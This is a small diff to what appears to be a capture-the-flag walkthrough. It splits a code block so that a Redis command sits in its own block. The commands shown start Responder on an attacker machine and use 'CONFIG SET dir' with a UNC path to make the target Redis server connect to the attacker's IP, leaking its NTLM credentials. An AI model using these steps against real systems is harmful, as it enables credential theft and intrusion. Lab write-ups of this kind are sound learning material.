@@ -76,6 +76,9 @@ Access is granted without a password. To escalate this, we use Responder to capt
 
 ```zsh
 $ sudo responder -I tun0 -dwv # Start Responder on the attacker machine
+```
+
+```PowerShell
 > CONFIG SET dir \\192.168.144.226\fakefolder\ # Inside Redis CLI, trigger a connection to the attacker's IP
 ```
 
